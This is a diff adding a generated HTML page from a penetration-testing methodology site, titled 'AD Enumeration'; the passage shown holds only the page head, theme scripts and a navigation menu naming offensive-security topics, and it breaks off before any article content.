@@ -1,0 +1,4527 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://tomfieber.github.io/methodologies/infrastructure/notes/infra-001-ad-enumeration/">
+      
+      
+        <link rel="prev" href="../../internal/inpt-04-smb/">
+      
+      
+        <link rel="next" href="../infra-002-ldap-powerview/">
+      
+      
+      <link rel="icon" href="../../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.12">
+    
+    
+      
+        <title>AD Enumeration - The Okayest Pentester</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.2afb09e1.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+  
+
+
+  
+  
+
+<script id="__analytics">function __md_analytics(){function e(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],e("js",new Date),e("config","G-HH4Y2D319L"),document.addEventListener("DOMContentLoaded",(function(){document.forms.search&&document.forms.search.query.addEventListener("blur",(function(){this.value&&e("event","search",{search_term:this.value})}));document$.subscribe((function(){var t=document.forms.feedback;if(void 0!==t)for(var a of t.querySelectorAll("[type=submit]"))a.addEventListener("click",(function(a){a.preventDefault();var n=document.location.pathname,d=this.getAttribute("data-md-value");e("event","feedback",{page:n,data:d}),t.firstElementChild.disabled=!0;var r=t.querySelector(".md-feedback__note [data-md-value='"+d+"']");r&&(r.hidden=!1)})),t.hidden=!1})),location$.subscribe((function(t){e("config","G-HH4Y2D319L",{page_path:t.pathname})}))}));var t=document.createElement("script");t.async=!0,t.src="https://www.googletagmanager.com/gtag/js?id=G-HH4Y2D319L",document.getElementById("__analytics").insertAdjacentElement("afterEnd",t)}</script>
+  
+    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
+  
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#ad-enumeration" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../../../.." title="The Okayest Pentester" class="md-header__button md-logo" aria-label="The Okayest Pentester" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            The Okayest Pentester
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              AD Enumeration
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="blue-grey" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/tomfieber/tomfieber.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    tomfieber/tomfieber.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../about_me/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  About me
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../blog/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Blog
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Methodologies
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="The Okayest Pentester" class="md-nav__button md-logo" aria-label="The Okayest Pentester" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    The Okayest Pentester
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/tomfieber/tomfieber.github.io" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    tomfieber/tomfieber.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Home
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../about_me/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    About me
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            About me
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../about_me/about-01-cv/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    CV
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../../blog/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    Blog
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Blog
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_2" id="__nav_3_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Archive
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_2">
+            <span class="md-nav__icon md-icon"></span>
+            Archive
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../blog/archive/2025/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    2025
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_3" id="__nav_3_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Categories
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_3">
+            <span class="md-nav__icon md-icon"></span>
+            Categories
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../blog/category/tryhackme/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    TryHackMe
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+    
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../blog/category/writeups/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Writeups
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    Methodologies
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Methodologies
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Infrastructure
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            Infrastructure
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2_1" id="__nav_4_2_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Cloud
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2_1">
+            <span class="md-nav__icon md-icon"></span>
+            Cloud
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cloud/cloud-01-azure/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Pentesting Azure
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2_2" id="__nav_4_2_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    External
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            External
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../external/enpt-01-recon/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Recon
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2_3" id="__nav_4_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    General
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            General
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../general/general-01-nmap/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Scanning
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../general/general-02-low-hanging-fruit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Low Hanging Fruit
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../general/general-03-transferring-files/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Transferring Files
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../general/general-04-shells/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Shells
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../general/general-05-password-attacks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Password Attacks
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../general/general-06-common-services/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Attacking Common Services
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../general/general-07-pivoting/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Pivoting
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_3_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2_3_8" id="__nav_4_2_3_8_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    C2
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_4_2_3_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2_3_8">
